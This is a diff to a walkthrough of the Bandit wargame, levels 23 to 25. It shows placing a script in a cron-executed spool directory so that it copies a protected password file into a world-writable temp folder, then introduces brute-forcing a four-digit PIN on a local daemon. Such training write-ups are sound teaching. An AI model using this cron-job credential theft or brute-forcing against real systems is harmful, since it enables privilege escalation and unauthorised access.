@@ -382,8 +382,34 @@ Following the same steps as the previous levels, we reach the shell script:
 
 (pic)
 
-This script executes and deletes all files in /var/spool/bandit24/foo
+This script executes and deletes all files in /var/spool/bandit24/foo.
 
-Since the password is stored in /etc/bandit_pass/bandit24, we can create a shell script that returns its contents:
+To do this, we can first generate a secure temporary directory so we can work comfortably and give it full permissions so the program can access it. Then we go to said directory:
+```bash
+$ mktemp -d
+$ chmod 777 /tmp/tmp.{name}
+$ cd /tmp/tmp.{name}
+```
+**Giving full permissions is not recommended, as anyone can read, write, and execute the file/directory**
 
+Since the password is stored in /etc/bandit_pass/bandit24, we can create a shell script that returns its contents and adds it to a file in our /tmp/ directory. We give the file full permissions so the program can access it:
+```bash
+$ echo -e "#! /bin/bash  cat /etc/bandit_pass/bandit24 > /tmp/tmp.{name}/pass" > getpw.sh
+$ chmod 777 getpw.sh
+```
+Then we create the file where the password will go and give it permissions so the program can write to it:
+```bash
+$ touch pass
+$ chmod 777 pass
+```
+Finally, we copy the file to /var/spool/bandit24/foo, which is there the files are being executed:
+```bash
+$ cp getpw.sh /var/spool/bandit24/foo
+```
 
+After waiting a while, we can visualize the password inside the file using ```cat```.
+
+## Level 24 -> Level 25
+A daemon (program that runs in the background) listens on port 30002 and will give the pass for next level if given last level's plus a secret 4-digit pincode. The only way to obtain it is by going through all 10000 combinations.
+
+To find the right pincode, we'll have to use a method known as brute-forcing, which means trying one by one until we find the right one.
